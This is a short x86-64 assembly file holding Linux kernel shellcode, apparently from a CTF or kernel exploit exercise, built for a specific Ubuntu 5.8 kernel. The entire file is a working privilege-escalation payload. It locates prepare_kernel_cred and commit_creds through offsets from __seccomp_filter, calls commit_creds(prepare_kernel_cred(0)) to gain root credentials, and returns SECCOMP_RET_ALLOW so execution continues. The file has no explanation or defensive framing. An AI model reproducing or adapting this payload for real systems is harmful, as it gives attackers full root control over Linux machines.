BITS 64

; Linux chief-vm 5.8.0-41-generic #46~20.04.1-Ubuntu SMP Mon Jan 18 17:52:23 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
;ffffffff810d1e10 T commit_creds
;ffffffff810d22a0 T prepare_kernel_cred
;ffffffff8119d740 t __seccomp_filter

push rax
mov rax, [rsp + 8]      ; Grab return addr

; Offset to __seccomp_filter
sub rax, 0x7E
push rdi
push rax

; Offset `__seccomp_filter` to `prepare_kernel_cred`
sub rax, 832672
xor rdi, rdi
call rax
mov rdi, rax

pop rax
; Offset `__seccomp_filter` to `commit_creds`
sub rax, 833840
call rax 

pop rdi
pop rax
mov eax, 0x7FFF0000 ; SECCOMP_RET_ALLOW
ret

